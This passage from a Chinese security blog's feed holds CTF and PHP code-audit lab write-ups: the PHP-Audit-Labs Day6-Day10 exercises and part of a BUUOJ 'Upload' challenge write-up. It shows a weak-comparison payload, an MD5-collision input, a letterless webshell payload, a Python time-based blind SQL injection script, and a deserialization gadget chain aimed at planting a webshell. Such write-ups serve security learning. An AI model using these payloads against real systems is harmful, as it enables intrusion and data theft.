class="line">            if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password))</span><br><span class="line">            $c +&#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ($c &lt; 3) break;</span><br><span class="line">        if (&quot;42&quot; &#x3D;&#x3D; $password) echo $flag;</span><br><span class="line">        else echo &#39;Wrong password&#39;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这道题主要考察正则表达式，和弱类型比较的问题，<br>| <em>alnum</em>  | 字母和数字            |<br>| ——– | —————- |<br>| <em>alpha</em>  | 字母               |<br>| <em>ascii</em>  | 0 - 127的ascii字符  |<br>| <em>blank</em>  | 空格和水平制表符         |<br>| <em>cntrl</em>  | 控制字符             |<br>| <em>digit</em>  | 十进制数(same as \d) |<br>| <em>graph</em>  | 打印字符, 不包括空格      |<br>| <em>lower</em>  | 小写字母             |<br>| <em>print</em>  | 打印字符,包含空格        |<br>| <em>punct</em>  | 打印字符, 不包括字母和数字   |<br>| <em>space</em>  | 空白字符 (比\s多垂直制表符) |<br>| <em>upper</em>  | 大写字母             |<br>| <em>word</em>   | 单词字符(same as \w) |<br>| <em>xdigit</em> | 十六进制数字           |</p><p>代码中共有三处正则表达式匹配，挨个看一下。<br>第一处的正则 <strong>/^[[:graph:]]{12,}$/</strong> 为：匹配到可打印字符12个以上(包含12)，<strong>^</strong> 号表示必须以某类字符开头，<strong>$</strong> 号表示必须以某类字符结尾。第二处正则表达式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>表示字符串中，把连续的符号、数字、大写、小写，作为一段，至少分六段。<br>第三处:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ps = <span class="keyword">array</span>(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/[[:$pt:]]+/"</span>, $password))</span><br><span class="line">    $c += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>表示为输入的字符串至少含有符号、数字、大写、小写中的三种类型。然后题目最后将 <strong>$password</strong> 与42进行了弱比较。<br>最后pyayload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">42.000e-0000</span><br></pre></td></tr></table></figure><h3 id="Day7"><a href="#Day7" class="headerlink" title="Day7"></a>Day7</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &quot;hongri&quot;;</span><br><span class="line">echo $a;</span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">@parse_str($id);</span><br><span class="line">if ($a[0] !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; md5($a[0]) &#x3D;&#x3D; md5(&#39;QNKCDZO&#39;)) &#123;</span><br><span class="line">    echo &#39;&lt;a href&#x3D;&quot;uploadsomething.php&quot;&gt;flag is here&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">$referer &#x3D; $_SERVER[&#39;HTTP_REFERER&#39;];</span><br><span class="line">if(isset($referer)!&#x3D;&#x3D; false) &#123;</span><br><span class="line">    $savepath &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SERVER[&#39;REMOTE_ADDR&#39;]) . &quot;&#x2F;&quot;;</span><br><span class="line">    if (!is_dir($savepath)) &#123;</span><br><span class="line">        $oldmask &#x3D; umask(0);</span><br><span class="line">        mkdir($savepath, 0777);</span><br><span class="line">        umask($oldmask);</span><br><span class="line">    &#125;</span><br><span class="line">    if ((@$_GET[&#39;filename&#39;]) &amp;&amp; (@$_GET[&#39;content&#39;])) &#123;</span><br><span class="line">        &#x2F;&#x2F;$fp &#x3D; fopen(&quot;$savepath&quot;.$_GET[&#39;filename&#39;], &#39;w&#39;);</span><br><span class="line">        $content &#x3D; &#39;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#39;;</span><br><span class="line">        file_put_contents(&quot;$savepath&quot; . $_GET[&#39;filename&#39;], $content);</span><br><span class="line">        $msg &#x3D; &#39;Flag is here,come on~ &#39; . $savepath . htmlspecialchars($_GET[&#39;filename&#39;]) . &quot;&quot;;</span><br><span class="line">        usleep(100000);</span><br><span class="line">        $content &#x3D; &quot;Too slow!&quot;;</span><br><span class="line">        file_put_contents(&quot;$savepath&quot; . $_GET[&#39;filename&#39;], $content);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>先提交一个<code>id=a[0]=s878926199a</code>，然后条件竞争一下就好了。</p><h3 id="Day8"><a href="#Day8" class="headerlink" title="Day8"></a>Day8</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&#x2F;&#x2F; $hint &#x3D; &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>无字母数字webshell，直接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo urlencode(~&#39;phpinfo&#39;);</span><br><span class="line">&#x2F;&#x2F;输出：%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure><p>然后提交<code>?code=(~%8F%97%8F%96%91%99%90)()</code>，便可以了。</p><h3 id="Day10"><a href="#Day10" class="headerlink" title="Day10"></a>Day10</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;;</span><br><span class="line">function stophack($string)&#123;</span><br><span class="line">    if(is_array($string))&#123;</span><br><span class="line">        foreach($string as $key &#x3D;&gt; $val) &#123;</span><br><span class="line">            $string[$key] &#x3D; stophack($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $raw &#x3D; $string;</span><br><span class="line">        $replace &#x3D; array(&quot;\\&quot;,&quot;\&quot;&quot;,&quot;&#39;&quot;,&quot;&#x2F;&quot;,&quot;*&quot;,&quot;%5C&quot;,&quot;%22&quot;,&quot;%27&quot;,&quot;%2A&quot;,&quot;~&quot;,&quot;insert&quot;,&quot;update&quot;,&quot;delete&quot;,&quot;into&quot;,&quot;load_file&quot;,&quot;outfile&quot;,&quot;sleep&quot;,);</span><br><span class="line">        $string &#x3D; str_ireplace($replace, &quot;HongRi&quot;, $string);</span><br><span class="line">        $string &#x3D; strip_tags($string);</span><br><span class="line">        if($raw!&#x3D;$string)&#123;</span><br><span class="line">            error_log(&quot;Hacking attempt.&quot;);</span><br><span class="line">            header(&#39;Location: &#x2F;error&#x2F;&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        return trim($string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$conn &#x3D; new mysqli($servername, $username, $password, $dbname);</span><br><span class="line">if ($conn-&gt;connect_error) &#123;</span><br><span class="line">    die(&quot;连接失败: &quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;id&#39;]) &amp;&amp; $_GET[&#39;id&#39;])&#123;</span><br><span class="line">    $id &#x3D; stophack($_GET[&#39;id&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;SELECT * FROM students WHERE id&#x3D;$id&quot;;</span><br><span class="line">    $result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">    if($result-&gt;num_rows &gt; 0)&#123;</span><br><span class="line">        $row &#x3D; $result-&gt;fetch_assoc();</span><br><span class="line">        echo &#39;&lt;center&gt;&lt;h1&gt;查询结果为：&lt;&#x2F;h1&gt;&lt;pre&gt;&#39;.&lt;&lt;&lt;EOF</span><br><span class="line">        +----+---------+--------------------+-------+</span><br><span class="line">        | id | name    | email              | score |</span><br><span class="line">        +----+---------+--------------------+-------+</span><br><span class="line">        |  &#123;$row[&#39;id&#39;]&#125; | &#123;$row[&#39;name&#39;]&#125;   | &#123;$row[&#39;email&#39;]&#125;   |   &#123;$row[&#39;score&#39;]&#125; |</span><br><span class="line">        +----+---------+--------------------+-------+&lt;&#x2F;center&gt;</span><br><span class="line">EOF;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else die(&quot;你所查询的对象id值不能为空！&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>时间的盲注，使用benchmark。脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import sys, string, requests</span><br><span class="line"></span><br><span class="line">version_chars &#x3D; &quot;.-&#123;&#125;_&quot; + string.ascii_letters + string.digits + &#39;#&#39;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">for i in range(1,40):</span><br><span class="line">    for char in version_chars:</span><br><span class="line">        payload &#x3D; &quot;-1 or if(ascii(mid((select flag from flag),%s,1))&#x3D;%s,benchmark(200000000,7^3^8),0)&quot; % (i,ord(char))</span><br><span class="line">        url &#x3D; &quot;http:&#x2F;&#x2F;localhost&#x2F;index.php?id&#x3D;%s&quot; % payload</span><br><span class="line">        if char &#x3D;&#x3D; &#39;#&#39;:</span><br><span class="line">            if(flag):</span><br><span class="line">                sys.stdout.write(&quot;\n[+] The flag is： %s&quot; % flag)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;[-] Something run error!&quot;)</span><br><span class="line">            exit()</span><br><span class="line">        try:</span><br><span class="line">            r &#x3D; requests.post(url&#x3D;url, timeout&#x3D;2.0)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            flag +&#x3D; char</span><br><span class="line">            sys.stdout.write(&quot;\r[-] Try to get flag： %s&quot; % flag)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            break</span><br><span class="line">print(&quot;[-] Something run error!&quot;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在github上面找的一个代码审计的项目，地址是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/hongriSec/PHP-Audit-Labs/&quot;&gt;https://github.com/hongriSec/PHP-Audit-Labs/&lt;/a&gt;&lt;br&gt;正好通过这个项目练习一下代码审计，每个都包含了不同的知识点，学习学习。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>buu刷题记录（三）</title>
    <link href="http://yoursite.com/2020/08/10/buuoj-03/"/>
    <id>http://yoursite.com/2020/08/10/buuoj-03/</id>
    <published>2020-08-10T04:55:56.000Z</published>
    <updated>2020-09-16T05:12:38.341Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h1><blockquote><p>代码审计，反序列化</p></blockquote><p>代码审计真的头疼，太难了。<br>进入页面有个登陆框，注册登陆，有个上传页面，试了上传webshell无果，看cookie是一段编码，解码之后是序列化后的字符串，肯定就是反序列化了，扫后台发现<strong><a href="http://www.tar.gz">www.tar.gz</a></strong>，下载下来，审计源码。</p><a id="more"></a><p>文件这么多，既然是反序列化，直接搜索反序列化的魔法函数，这样快一点，一般都是搜索<strong>__call</strong>和<strong>__destruct</strong>，<br>然后在<code>application/web/controller/Profile.php</code>这个文件里发现了<code>__call</code>方法和<code>__get__</code>方法</p><ul><li><strong>call：当调用类中不可访问属性时，</strong>call将自动被调用。</li><li><strong>get： 当调用类中不可访问对象时，</strong>get将自动被调用。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"># Profile.php</span><br><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line"></span><br><span class="line">use think\Controller;</span><br><span class="line"></span><br><span class="line">class Profile extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public $checker;</span><br><span class="line">    public $filename_tmp;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $upload_menu;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $img;</span><br><span class="line">    public $except;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;checker&#x3D;new Index();</span><br><span class="line">        $this-&gt;upload_menu&#x3D;md5($_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">        @chdir(&quot;..&#x2F;public&#x2F;upload&quot;);</span><br><span class="line">        if(!is_dir($this-&gt;upload_menu))&#123;</span><br><span class="line">            @mkdir($this-&gt;upload_menu);</span><br><span class="line">        &#125;</span><br><span class="line">        @chdir($this-&gt;upload_menu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function upload_img()&#123;</span><br><span class="line">        if($this-&gt;checker)&#123;</span><br><span class="line">            if(!$this-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url&#x3D;&quot;http:&#x2F;&#x2F;&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;&#x2F;index&quot;;</span><br><span class="line">                $this-&gt;redirect($curr_url,302);</span><br><span class="line">                exit();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!empty($_FILES))&#123;</span><br><span class="line">            $this-&gt;filename_tmp&#x3D;$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">            $this-&gt;filename&#x3D;md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;</span><br><span class="line">            $this-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        if($this-&gt;ext) &#123;</span><br><span class="line">            if(getimagesize($this-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy($this-&gt;filename_tmp, $this-&gt;filename);</span><br><span class="line">                @unlink($this-&gt;filename_tmp);</span><br><span class="line">                $this-&gt;img&#x3D;&quot;..&#x2F;upload&#x2F;$this-&gt;upload_menu&#x2F;$this-&gt;filename&quot;;</span><br><span class="line">                $this-&gt;update_img();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;error(&#39;Forbidden type!&#39;, url(&#39;..&#x2F;index&#39;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;error(&#39;Unknow file type!&#39;, url(&#39;..&#x2F;index&#39;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function update_img()&#123;</span><br><span class="line">        $user_info&#x3D;db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile[&#39;ID&#39;])-&gt;find();</span><br><span class="line">        if(empty($user_info[&#39;img&#39;]) &amp;&amp; $this-&gt;img)&#123;</span><br><span class="line">            if(db(&#39;user&#39;)-&gt;where(&#39;ID&#39;,$user_info[&#39;ID&#39;])-&gt;data([&quot;img&quot;&#x3D;&gt;addslashes($this-&gt;img)])-&gt;update())&#123;</span><br><span class="line">                $this-&gt;update_cookie();</span><br><span class="line">                $this-&gt;success(&#39;Upload img successful!&#39;, url(&#39;..&#x2F;home&#39;));</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;error(&#39;Upload file failed!&#39;, url(&#39;..&#x2F;index&#39;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function update_cookie()&#123;</span><br><span class="line">        $this-&gt;checker-&gt;profile[&#39;img&#39;]&#x3D;$this-&gt;img;</span><br><span class="line">        cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function ext_check()&#123;</span><br><span class="line">        $ext_arr&#x3D;explode(&quot;.&quot;,$this-&gt;filename);</span><br><span class="line">        $this-&gt;ext&#x3D;end($ext_arr);</span><br><span class="line">        if($this-&gt;ext&#x3D;&#x3D;&quot;png&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>这个类主要处理上传文件的逻辑，创建目录，重命名文件，修改后缀，上传文件。不管是什么文件都会修改成png格式的。<br>但是只有这一个类也没法使用，再查找<strong>__destruct</strong>函数，在<code>application/web/controller/Register.php</code>文件中找到这个方法。<br>关键代码如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># Register.php</span><br><span class="line">&lt;?php</span><br><span class="line">class Register extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public $checker;</span><br><span class="line">    public $registed;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;checker&#x3D;new Index();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$this-&gt;registed)&#123;</span><br><span class="line">            $this-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>当对象被销毁时，调用<code>__destruct</code>方法，调用<code>$this-&gt;checker</code>对象的<code>index()</code>函数，而Profile类中是没有这个函数的，这样就可以成功触发<strong>__call</strong>方法，<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function __get($name)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __call($name, $arguments)</span><br><span class="line">&#123;</span><br><span class="line">    if($this-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>说一下这里<strong>call的两个参数，第一个参数<code>$name</code>会自动接收不存在的方法名，第二个<code>$arguments</code>则以数组的方式接收不存在方法的多个参数。<br>在```</strong>destruct<code>中调用$this-&gt;checker-&gt;index()，index就会变成__call的第一个参数传递进去，而index()中没有参数，__call中的第二个参数也就为空。参数传递进去后，就变成在__call中调用 **$this-&gt;index()**，而这个类中是没有这个对象的，然后触发 **__get** 方法。然后看</code>application/web/controller/Index.php```文件，关键代码如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">class Index extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public $profile;</span><br><span class="line">    public $profile_db;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;login_check())&#123;</span><br><span class="line">            $curr_url&#x3D;&quot;http:&#x2F;&#x2F;&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;&#x2F;home&quot;;</span><br><span class="line">            $this-&gt;redirect($curr_url,302);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;fetch(&quot;index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public function login_check()&#123;</span><br><span class="line">        $profile&#x3D;cookie(&#39;user&#39;);</span><br><span class="line">        if(!empty($profile))&#123;</span><br><span class="line">            $this-&gt;profile&#x3D;unserialize(base64_decode($profile));</span><br><span class="line">            $this-&gt;profile_db&#x3D;db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,intval($this-&gt;profile[&#39;ID&#39;]))-&gt;find();</span><br><span class="line">            if(array_diff($this-&gt;profile_db,$this-&gt;profile)&#x3D;&#x3D;null)&#123;</span><br><span class="line">                return 1;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                return 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>在<strong>index()</strong>中调用<strong>login_check()</strong>，而在login_check()中把cookie中传来的值直接进行反序列化，<br>我们再看Profile类中<br><img src="/images/buuoj-03/20200810135451.png" alt=""><br>在<strong>upload_img()</strong>函数开始时会自动调用login_check()，然后再往下看<br><img src="/images/buuoj-03/20200810140123.png" alt=""><br>这里会将文件进行重命名，我们就可以通过重命名将已经上传的png文件重命名为php文件，从而获取webshell，前面那个检查文件名后缀只有在通过表单上传文件时才会触发。<br>这样思路就清楚了，<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&gt;Register-&gt;__destruct()</span><br><span class="line">&#x3D;&#x3D;&gt;Profile-&gt;__call()</span><br><span class="line">&#x3D;&#x3D;&gt;Profile-&gt;__get()</span><br><span class="line">&#x3D;&#x3D;&gt;Profile-&gt;upload_img()</span><br></pre></td></tr></table></figure>先随便上传一个写有weshell的jpg后缀的文件，然后通过访问/upload/获取文件名，接下来就开始构造：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 